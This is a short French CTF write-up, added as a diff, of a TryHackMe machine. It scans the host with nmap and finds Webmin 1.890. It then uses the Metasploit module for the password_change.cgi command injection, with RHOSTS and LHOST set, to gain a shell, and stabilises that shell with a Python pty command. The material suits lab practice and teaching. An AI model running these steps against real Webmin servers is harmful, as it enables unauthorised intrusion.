@@ -1,0 +1,31 @@
+Source - CTF sur TryHackMe
+
+Scanne du reseau : nmap -sC -sV -oA nmap 10.10.38.56 
+-> Deux ports sont ouverts sur cette machine 
+  -> le port 22 = 22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+  -> le port 1000 = 10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
+
+Recherche sur le web : https://10.10.38.56 
+-> le site est introuvable
+
+Nouvelle recherche avec l'URL https://10.10.38.56:10000/
+-> Donne accès au site Webmin
+
+Recherche "webmin" sur AttackerKB :
+-> ON trouve = Webmin password_change.cgi Command Injection 
+  -> En lisant l'analyse technique, on apprend que cette exploitation fonctionne aussi sur la version 1.890 du site (celle que nous avons)
+  
+Dans un terminale je lance la metasploit console avec msfconsole pour chercher le script indiquer sur AttackerKB
+
+Je change LHOST et RHOSTS ainsi que ssl :
+set RHOSTS 10.10.38.68 (Machine IP)
+set LHOST 10.11.61.213 (YOUR IP)
+set ssl true
+
+Et je lance avec la commande run 
+
+J'ai accès au système !
+
+Je lance la commande ci-dessous pour avoir un shell stable :
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/anyname.py
+python /tmp/anyname.py
